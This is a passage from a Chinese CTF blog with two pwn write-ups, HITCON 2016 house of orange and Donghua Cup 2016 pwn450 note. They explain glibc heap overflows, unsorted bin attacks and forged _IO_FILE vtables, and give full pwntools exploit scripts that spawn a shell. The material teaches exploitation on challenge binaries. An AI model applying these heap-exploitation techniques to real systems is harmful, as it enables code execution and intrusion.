        <content type="html"><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/1f6IBfouAMu1PFnck0vJ41Q">https://pan.baidu.com/s/1f6IBfouAMu1PFnck0vJ41Q</a><br>提取码：rg6j</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; checksec houseoforange_hitcon_2016 </span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/Share/ctfwiki/pwn/io_file/houseoforange_hitcon_2016&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>Upgrade里没有和原来的大小做比较存在堆溢出，只能申请最多四次，而且只能更新最近的一个orange，没有free项</p><h2 id="泄露libc和heap地址"><a href="#泄露libc和heap地址" class="headerlink" title="泄露libc和heap地址"></a>泄露libc和heap地址</h2><p><code>add(0x10,b&quot;a&quot;) payload=b&#39;a&#39;*0x10+p64(0)+p64(0x21)+p64(0x1f00000001)+p64(0)*2+p64(0xfa1) edit(len(payload),payload)</code></p><p>先申请小堆块，利用溢出修改topchunk大小，注意我们申请的三个堆是中间的堆，别忘了页对齐</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410091710000.png" alt="image-20230410091710000"></p><p><code>add(0x1000,b&#39;a&#39;)</code></p><p>申请的大chunk会把topchunk链入unsortedbin，因为前面会再申请一个0x10大小的chunk所以60变成了80,后面会再切割一个0x8chunk，80变为a0，后面就不会再提了</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410092959397.png" alt="image-20230410092959397"></p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410092846998.png" alt="image-20230410092846998"></p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410091908716.png" alt="image-20230410091908716"></p><p>我们这个时候去随便切割一块就可以拿到main_raena+88的地址，但是我们后面House of orange还会用到堆的地址</p><p>这个时候我们需要利用unsortedbin的机制，如果unsorted bin中只有一个chunk且这个chunk是last remainder chunk，申请堆块大小为largebin时，会先把这个chunk放到largedbin里再切割，这个时候会有fd_nextsize和bk_nextsize的链表，由于largebin里只有一个chunk，fd_nextsize和bk_nextsize会链向自己</p><p><code>add(0x400,b&#39;c&#39;)</code></p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410132956019.png" alt="image-20230410132956019"></p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410122608560.png" alt="image-20230410122608560"></p><p><code>show()</code>直接打印泄露libc基地址</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410122710779.png" alt="image-20230410122710779"></p><p><code>edit(0x10,b&#39;a&#39;*11+b&#39;grxer&#39;)</code>把前16个数据覆盖就可以打印出heap地址</p><h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">fake_file=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(_IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># fake_file+=b&#x27;grxer666&#x27;</span></span><br><span class="line">fake_file+=p64(heap+<span class="number">0x508</span>+<span class="number">8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(system)</span><br><span class="line">payload+=fake_file</span><br></pre></td></tr></table></figure><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410125530529.png" alt="image-20230410125530529"></p><p>注意一下绕过一下中间的块</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410132008871.png" alt="image-20230410132008871"></p><p>常规绕过伪造 IO_FILE_plus 这次我们直接把mode改为0(判断条件时&lt;&#x3D;就行)，可以直接ljust到0xd8，到vtable</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_file+=p64(heap+<span class="number">0x508</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)*<span class="number">0</span>+p64(system)</span><br></pre></td></tr></table></figure><p>这样伪造也可以把_vtable当成我们第一个jump函数，payload更短</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_FILE_plus*)0x5555557584f0</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x60 &lt;error: Cannot access memory at address 0x60&gt;, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd2510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x5555557585d0</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_jump_t*)0x5555557585d0</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = &#123;</span></span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x0, </span><br><span class="line">  __overflow = 0x7ffff7a523a0 &lt;__libc_system&gt;, </span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  __seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x0, </span><br><span class="line">  __close = 0x0, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪造完成，再申请一个堆块就可以触发__overflow调用链</p><p><img src="/2023/04/10/2016-hitcon-house-of-orange/image-20230410132625782.png" alt="image-20230410132625782"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./houseoforange_hitcon_2016&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&quot;26057&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,price=<span class="number">1</span>,color=<span class="number">1</span></span>):</span><br><span class="line">    ru(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&quot;Length of name :&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    ru(<span class="string">b&quot;Name :&quot;</span>)</span><br><span class="line">    s(name)</span><br><span class="line">    ru(<span class="string">b&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(price).encode())</span><br><span class="line">    ru(<span class="string">b&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    ru(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,name,price=<span class="number">1</span>,color=<span class="number">0xddaa</span></span>):</span><br><span class="line">    ru(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&quot;Length of name :&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    ru(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    s(name)</span><br><span class="line">    ru(<span class="string">b&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(price).encode())</span><br><span class="line">    ru(<span class="string">b&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(color).encode())</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x1f00000001</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27; house : &#x27;</span>)</span><br><span class="line">libcbase=uu64(r(<span class="number">6</span>))-<span class="number">0x3c5163</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">unsorted_bin=libcbase+<span class="number">0x68</span>+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">_IO_list_all=libcbase+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system=libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libcbase)</span><br><span class="line">p(<span class="string">&#x27;unsotr&#x27;</span>,unsorted_bin)</span><br><span class="line">p(<span class="string">&#x27;iolist&#x27;</span>,_IO_list_all)</span><br><span class="line">edit(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span>+<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;grxer&#x27;</span>)</span><br><span class="line">heap=uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">fake_file=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(_IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># fake_file+=b&#x27;grxer666&#x27;</span></span><br><span class="line">fake_file+=p64(heap+<span class="number">0x508</span>+<span class="number">8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(system)</span><br><span class="line">payload+=fake_file</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">ru(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Orange </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2016东华杯pwn450-note</title>
      <link href="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/"/>
      <url>/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/1QEKd37yhK-vTDxViS76q5A">https://pan.baidu.com/s/1QEKd37yhK-vTDxViS76q5A</a><br>提取码：vbek</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; checksec ./16pwn450_note </span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/ctfwiki/pwn/io_file/16pwn450_note&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>程序可以申请一个最小512堆块，最大无限制</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400B3B</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+17h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = v4++;</span><br><span class="line">    *(_BYTE *)(a1 + v1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)((<span class="type">int</span>)v4 + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br></pre></td></tr></table></figure><p>该函数可以无限溢出堆块，狂喜</p><h2 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h2><p>唯一一个打印信息的地方是打印申请到的内存地址，我们可以利用mmap申请一个内存，会和libc有一个固定偏移</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230410000002101.png" alt="image-20230410000002101"></p><p>mmap阈值为128k</p><p><code>new(0x200000)#libcbase libcbase=int(rl(),16)+0x201000-0x10</code></p><p>拿到基地址</p><h2 id="unsorted-bin-attack-amp-amp-house-of-orange"><a href="#unsorted-bin-attack-amp-amp-house-of-orange" class="headerlink" title="unsorted bin attack &amp;&amp; house of orange"></a>unsorted bin attack &amp;&amp; house of orange</h2><p>因为只有一个堆块，free后肯定会和topchunk合并，不会进入bin里，只能利用切割topchunk时大小不合适，去重新申请一块大内存同时把oldchunk放入unsortedbin，同时需要构造多个unsortedbin才可以在切割时把0x60大小的bin送人small bin伪造_chain</p><p><code>new(0x200) payload=b&#39;\x00&#39;*0x200+p64(0)+p64(0x10df1)</code></p><p>用溢出改掉大小，再free再申请一个比这个chunk还大的内存，把这个chunk放入unsortedbin</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409231152136.png" alt="image-20230409231152136"></p><p><code>new(0x200)</code></p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409231752579.png" alt="image-20230409231752579"></p><p>切割下来一块</p><p><code>payload=b&#39;\x00&#39;*0x200+p64(0)+p64(0x10dd1)+p64(unsorted_bin)*2+b&#39;\x00&#39;*0x10db0+p64(0x10dd0)+p64(0x11) edit(payload)</code></p><p>为了防止释放时unlink，把chunk的下一个chunk的prevsize和previnuse位改掉，释放到unsortedbin 且不合并</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409231532142.png" alt="image-20230409231532142"></p><p>这个时候就有一个问题，unsortedbin是FIFO的，每次只能申请一个会导致，每次拿出来的地址是高地址，没办法溢出覆盖低地址的在unsorted里的堆，所以我们需要再次申请<code>new(0x10d00)</code>会从大块的什么切割，同时把0x200的小块放到 small bin，打破这个顺序，因为申请是是先遍历smallbins</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409231930232.png" alt="image-20230409231930232"></p><p>free掉</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409232347124.png" alt="image-20230409232347124"></p><p>现在我们就可以申请出来smallbin然后通过溢出布置house of orange了</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409234910775.png" alt="image-20230409234910775"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10d11</span>)+p64(heap+<span class="number">0x210</span>)+p64(unsorted_bin)+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x10d10</span>-<span class="number">0x20</span>)<span class="comment">#溢出到第二个块</span></span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)+p64(unsorted_bin)+p64(_IO_list_all-<span class="number">0x10</span>)<span class="comment">#布置orange</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#write base</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)<span class="comment">#write ptr 绕过检测</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xc0</span>-<span class="number">48</span>) <span class="comment"># c0大小达到 mode</span></span><br><span class="line">payload+=p64(<span class="number">0xffffffffffffffff</span>)<span class="comment">#mode=-1</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xd8</span>-<span class="number">8</span>-<span class="number">0xc0</span>)<span class="comment">#到达_vtable</span></span><br><span class="line">payload+=p64(heap+<span class="number">0x10ff8</span>+<span class="number">8</span>)<span class="comment">#vtable指向下面写入下面数据的地址</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(system)</span><br></pre></td></tr></table></figure><p>我们把unsortedbin第二个块改为60大小，下一次申请时切割第一个unsortedbin，会把第二个块的bk-&gt;fd&#x3D;unsortedbin，同时放入smallbin 0x60大小里</p><p>绕过一些检测</p><p><code>payload+=p64(heap+0x10ff8+8)</code>可以根据前面填入的大小 0x10+0x200+0x10d10+0xd8+8&#x3D;0x1 1000 这里0x10是因为heap我们去了申请heap的chunkhead，而不是数据区开始，+8是因为这个字段本身占一个，或者通过在此次输入一个标识符进行搜索，计算偏移</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409235134812.png" alt="image-20230409235134812"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, </span><br><span class="line">    _IO_read_end = 0x7ffff7dd1b78 &lt;main_arena+88&gt; &quot;&quot;, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd2510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &quot;\377\377\377\377&quot;, &#x27;\000&#x27; &lt;repeats 15 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x614000</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_jump_t*)0x614000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = &#123;</span></span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x1, </span><br><span class="line">  __overflow = 0x7ffff7a523a0 &lt;__libc_system&gt;, </span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  __seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x0, </span><br><span class="line">  __close = 0x0, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409235705003.png" alt="image-20230409235705003"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./16pwn450_note&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libcelf=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;on---&gt;&gt;\n&#x27;</span>,<span 